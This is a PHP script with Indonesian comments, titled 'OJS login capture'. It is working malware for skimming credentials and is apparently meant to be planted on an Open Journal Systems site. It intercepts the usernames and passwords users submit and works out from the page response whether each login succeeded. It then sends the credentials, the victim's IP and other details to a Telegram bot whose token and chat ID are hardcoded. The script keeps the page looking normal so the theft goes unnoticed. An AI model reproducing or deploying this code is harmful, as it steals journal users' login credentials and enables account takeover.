<?php
/**
 * OJS LOGIN CAPTURE - DENGAN DETEKSI SUKSES/GAGAL (FIXED)
 * File: /home/stif6195/mail/list
 */

$bot_token = '8658565330:AAFP2t72z1pCVmqsI36HYnW2FZaCDjvfxGk';
$chat_id = '6614104922';

$username = '';
$password = '';

// Tangkap login dari POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
}

if (!empty($username) && !empty($password)) {
    
    // Mulai capture output
    ob_start();
    
    // Simpan data untuk dikirim setelah kita tahu hasil login
    $login_data = [
        'username' => $username,
        'password' => $password,
        'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'time' => date('Y-m-d H:i:s'),
        'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
        'path' => $_SERVER['REQUEST_URI'] ?? '/',
        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
    ];
    
    // Register shutdown function
    register_shutdown_function(function() use ($login_data, $bot_token, $chat_id) {
        // Ambil response
        $response = ob_get_clean();
        
        // ========== KIRIM LAGI OUTPUT KE BROWSER (INI YANG DITAMBAH) ==========
        echo $response;  // â† INI KUNCI NYA! Agar halaman tidak putih
        // ====================================================================
        
        // Cek apakah login GAGAL
        $is_failed = false;
        $error_indicators = ['Invalid', 'incorrect', 'wrong', 'failed', 'error', 'tidak valid', 'salah'];
        
        foreach ($error_indicators as $indicator) {
            if (stripos($response, $indicator) !== false) {
                $is_failed = true;
                break;
            }
        }
        
        // Cek apakah sukses (redirect)
        $headers = headers_list();
        $is_success = false;
        foreach ($headers as $header) {
            if (stripos($header, 'Location:') !== false && 
                (stripos($header, 'dashboard') !== false || stripos($header, 'index') !== false)) {
                $is_success = true;
                break;
            }
        }
        
        // Tentukan status
        if ($is_success) {
            $status = 'SUCCESS';
            $emoji = 'âœ…';
        } elseif ($is_failed) {
            $status = 'FAILED';
            $emoji = 'âŒ';
        } else {
            $status = 'ATTEMPT';
            $emoji = 'ðŸ”';
        }
        
        // Kirim notifikasi Telegram
        $message = "{$emoji} OJS LOGIN {$status}\n";
        $message .= "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n";
        $message .= "ðŸ‘¤ USERNAME: {$login_data['username']}\n";
        $message .= "ðŸ”‘ PASSWORD: {$login_data['password']}\n";
        $message .= "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n";
        $message .= "ðŸŒ IP: {$login_data['ip']}\n";
        $message .= "ðŸ“ PATH: {$login_data['path']}\n";
        $message .= "â° TIME: {$login_data['time']}\n";
        $message .= "ðŸŒ HOST: {$login_data['host']}\n";
        
        if ($is_failed) {
            $message .= "\nâš ï¸ PERHATIAN: Password SALAH!";
        }
        
        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_exec($ch);
            curl_close($ch);
        }
    });
}
?>
